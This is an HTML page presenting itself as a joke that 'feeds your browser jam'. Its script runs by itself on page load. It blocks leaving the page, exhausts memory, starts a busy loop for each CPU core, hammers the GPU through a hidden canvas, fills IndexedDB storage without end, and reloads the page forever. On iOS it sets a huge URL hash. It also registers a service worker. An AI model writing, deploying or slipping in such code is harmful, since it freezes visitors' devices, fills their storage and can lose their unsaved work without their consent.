<head>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    
    <link rel="preload" as="font" href="https://fonts.gstatic.com/s/himelody/v13/46ktlbP8Vnz0pJcqCTb0cWFX.woff2" type="font/woff2" crossorigin>
    
    <link href="https://fonts.googleapis.com/css2?family=Hi+Melody&display=swap" rel="stylesheet">
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="UTF-8">

    <meta name="google-site-verification" content="KdEIykkQd6Z_U6fm2NQcVIiGozbwknSroqn7FE8Jt-c" />

    <link rel="shortcut icon" type="image/jpg" href="https://files.catbox.moe/a2jxol.png"/><link rel="icon" type="image/jpg" href="https://files.catbox.moe/a2jxol.png"/>
    
    <link rel="stylesheet" href="./style.css">

    <title>jam</title>
    <style>
        html {
            overflow: hidden;
        }
        #cuteDrawing {
            position: fixed;
            top: 200vh; /* offscreen */
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: -999;
            pointer-events: none;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="message">
            <p>feeding your browser <span id="flavor"></span> flavored jam...</p>
            <p>your browser is now busy eating jam. it's "on break" until it's done eating its jam<br>(i gave it an infinite amount of jam)</p>
        </div>
    </div>
    <canvas id="cuteDrawing"></canvas>
    <script>
        function fillJamInformation() {
            let flavors = ["strawberry", "grape", "blueberry", "papaya", "blackberry", "raspberry", "mango", "apricot", "apple", "blackcurrant", "cherry", "prickly pear", "coconut", "dragonfruit", "durian", "elderberry", "fig", "gooseberry", "grapefruit", "honeyberry", "huckleberry", "kiwi", "juniper", "jackfruit", "japanese plum", "kumquat", "lemon", "lime", "lychee", "mango", "marionberry", "cantaloupe", "honeydew", "watermelon", "miraclefruit", "mulberry", "nectarine", "orange", "blood orange", "clementine", "mandarine", "tangerine", "passionfruit", "pawpaw", "peach", "pear", "persimmon", "plum", "pineapple", "pineberry", "pomegranate", "pomelo", "quince", "redcurrant", "rose", "salal", "starfruit", "tayberry", "thimbleberry", "white currant", "yuzu", "bell pepper", "carolina reaper", "chile pepper", "cucumber", "eggplant", "tomato", "pumpkin", "ram", "cpu core", "nvidia", "amd", `${Math.floor(Math.random() * 10) * 3}-volt`, "solder", "CPU fan", "cooling agent", "keyboard", "computer mouse", "4K monitor", "java", "javascript", "c", "c#", "c++", "binary", "assembly", "haskell", "css", "html", "opengl", "jquery", "stackoverflow", "typescript", ".net", "visual basic", "curl", "bash", "windows", "linux", "macos", "ecmascript", "fortran", "php", "rust", "regex"];
            let flavorDisplay = document.getElementById("flavor");
            
            function getRandomFlavor(amount) {
                var finalFlavor = Array.from({length: amount}, () => flavors[Math.floor(Math.random() * flavors.length)]);
                return [...new Set(finalFlavor)].join(" ");
            }

            let flavor = getRandomFlavor(Math.floor(Math.random() * 5) + 1);

            flavorDisplay.innerHTML = flavor;
            document.title = `free ${flavor} flavored jam`;
            
            // #xxxxxx
            let randomColor = "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
            
            flavorDisplay.style.setProperty("color", randomColor)
        }

        fillJamInformation();

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./worker.js');
        }

        setTimeout(() => {
            window.onbeforeunload = () => true;
            window.onunload = () => false;
            window.onclose = () => false;

            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
            } else {
                // mem
                let jam = [];
                setInterval(() => {
                    jam.push(new Array(10000000).fill('🍇🍈🍉🍊🍋🍋‍🟩🍌🍍🥭🍎🍏🍐'.repeat(1000)));
                }, 100);

                // cpu
                for (let i = 0; i < navigator.hardwareConcurrency; i++) {
                    new Worker(URL.createObjectURL(new Blob([`
                        while(1) {
                            Math.random() * Math.random();
                            new Uint8Array(1024*1024).map(x => Math.sqrt(x));
                        }
                    `])));
                }

                // gpu, if the browser has it
                const canvas = document.getElementById('cuteDrawing');
                const ctx = canvas.getContext('2d');
                canvas.width = 4096;
                canvas.height = 4096;
                setInterval(() => {
                    ctx.filter = `blur(${Math.random() * 100}px) contrast(${Math.random() * 1000}%)`;
                    ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                }, 0);

                const request = indexedDB.open("meow", 1);
                request.onupgradeneeded = (e) => {
                    const db = e.target.result;
                    const store = db.createObjectStore("meow", {autoIncrement: true});
                    setInterval(() => {
                        const tx = db.transaction("meow", "readwrite");
                        tx.objectStore("meow").add(new Array(1000000).fill('🏋️'));
                    }, 100);
                };

                for(;;) {
                    history.pushState({}, "", location.href);
                    location.reload(1);
                }
            }
        }, 50);
    </script>
</body></html>
